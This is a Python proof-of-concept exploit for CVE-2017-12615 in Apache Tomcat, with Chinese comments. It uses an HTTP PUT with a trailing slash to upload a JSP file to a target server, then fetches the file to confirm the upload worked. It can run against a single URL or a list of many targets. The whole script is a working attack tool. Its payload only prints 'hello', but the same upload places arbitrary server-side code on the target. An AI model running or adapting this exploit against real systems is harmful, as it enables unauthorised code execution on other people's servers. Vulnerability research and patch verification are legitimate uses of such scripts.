'''
Description: Tomcat 任意文件写入漏洞 (poc)
CVE: CVE-2017-12615
CNVD: 
Version: 1.0
Author: isok
Date: 2022-01-22 11:14:19
LastEditTime: 2022-01-22 12:49:50
'''

import requests
import argparse
import os

'''
name: verify
msg: 发包查看返回后的内容是否是之前已上传的文件内容
param {*} url
param {*} filename
return {*}
'''
def verify(url, filename):
    try:
        response = requests.get(url + filename)
        if response.status_code == 200 and "hello" in response.text:
            print("[+] {0} 存在  CVE-2017-12615 漏洞".format(url))
        else:
            pass
    except Exception as e:
        print("[-] {0} 连接失败".format(url))
        return 0

'''
name: upload
msg: 上传文件
param {*} url
param {*} filename
param {*} payload
return {*}
'''
def upload(url, filename, payload):
    try:
        response = requests.put(url + filename + "/", data=payload)
        return 1
    except Exception as e:
        print("[-] {0} 连接失败".format(url))
        return 0

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", dest="URL", type=str, help="target url (http://url)")
    parser.add_argument("-p", "--port", dest="PORT", type=int, default=8080, help="tomcat port(default 8080)")
    parser.add_argument("-f", dest="FILE", help="target url list (prefix include http://)")
    args = parser.parse_args()
    
    put_filename = "/a.jsp"
    payload = '<% out.println("hello");%>'
    
    if args.FILE and os.path.exists(args.FILE):
        with open(args.FILE) as f:
            urls = f.readlines()
            for url in urls:
                url = str(url).replace("\n","").replace("\r","").strip()
                url = url + ":" + str(args.PORT)
                if upload(url, put_filename, payload) == 1:
                    verify(url, put_filename)
    elif args.FILE and not os.path.exists(args.FILE):
        print("[-] {0} 文件不存在".format(args.FILE))
    else:
        url = args.URL + ":" + str(args.PORT)
        upload(url, put_filename, payload)
        verify(url, put_filename)
